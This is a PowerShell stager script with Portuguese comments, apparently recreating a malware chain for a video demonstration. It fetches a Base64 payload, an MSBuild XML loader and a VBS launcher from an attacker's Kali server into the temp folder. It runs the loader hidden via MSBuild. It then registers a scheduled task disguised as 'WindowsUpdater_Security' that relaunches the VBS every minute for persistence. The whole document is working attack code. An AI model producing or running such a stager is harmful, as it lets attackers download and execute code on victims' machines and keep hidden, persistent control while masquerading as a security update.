# Configurações de URL (Substitua IP-DO-KALI pelo seu IP)
$server = "http://IP-DO-KALI"
$urlTxt = "$server/qpwoe64.txt"
$urlXml = "$server/loader.xml"
$urlVbs = "$server/launcher.vbs"

$temp = $env:TEMP
$txtPath = "$temp\qpwoe64.txt"
$xmlPath = "$temp\loader.xml"
$vbsPath = "$temp\launcher.vbs"

# 1. Baixar o payload Base64 (Loop de validação)
while($true) {
    Invoke-WebRequest -Uri $urlTxt -OutFile $txtPath -ErrorAction SilentlyContinue
    if (Test-Path $txtPath) {
        if ((Get-Item $txtPath).Length -gt 100) { break }
    }
    Start-Sleep -Seconds 5
}

# 2. Baixar o loader XML e o vetor inicial VBS
Invoke-WebRequest -Uri $urlXml -OutFile $xmlPath
Invoke-WebRequest -Uri $urlVbs -OutFile $vbsPath

# 3. Execução via MSBuild (Living-off-the-Land)
$msbuild = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
Start-Process $msbuild -ArgumentList $xmlPath -WindowStyle Hidden

# 4. Configurar Persistência (Tarefa Agendada)
# Executa o launcher.vbs a cada 1 minuto (ajustável para o vídeo)
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$vbsPath"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName "WindowsUpdater_Security" -Action $action -Trigger $trigger -Description "Garante a persistencia do SHADOW#REACTOR" -Force